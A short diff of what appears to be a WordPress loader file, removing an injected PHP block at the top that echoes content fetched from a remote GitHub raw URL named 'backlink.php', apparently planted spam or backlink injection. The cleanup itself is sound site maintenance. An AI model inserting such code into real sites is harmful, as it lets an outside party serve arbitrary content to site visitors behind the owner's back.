@@ -1,6 +1,4 @@
-   <?php
-echo file_get_contents("https://raw.githubusercontent.com/sekjhhh/lp/main/backlink.php");
-?>
+
 <?php
 /**
  * Loads the WordPress environment and template.
